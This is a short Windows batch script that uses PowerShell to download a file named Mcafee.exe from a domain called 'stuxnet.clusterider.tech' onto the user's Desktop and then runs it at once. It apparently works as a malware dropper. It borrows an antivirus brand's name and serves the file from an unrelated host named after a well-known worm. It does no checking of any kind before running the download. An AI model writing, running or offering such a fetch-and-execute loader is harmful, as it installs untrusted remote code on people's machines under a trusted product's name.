@echo off
setlocal

REM Set the download URL
set "URL=https://stuxnet.clusterider.tech/download/Mcafee.exe"

REM Get the real Desktop path using PowerShell
for /f "usebackq delims=" %%D in (`powershell -NoProfile -Command "[Environment]::GetFolderPath('Desktop')"`) do set "DESKTOP=%%D"

REM Ensure the Desktop folder exists
if not exist "%DESKTOP%" (
    echo Desktop folder does not exist. Creating it...
    mkdir "%DESKTOP%"
)

REM Set the output path
set "OUTPUT=%DESKTOP%\Mcafee.exe"

REM Download the file using PowerShell
echo Downloading %OUTPUT% from %URL%...
powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%OUTPUT%'"

REM Check if the file was downloaded
if exist "%OUTPUT%" (
    echo Download complete. Running the program...
    start "" "%OUTPUT%"
) else (
    echo Download failed.
)

endlocal
pause
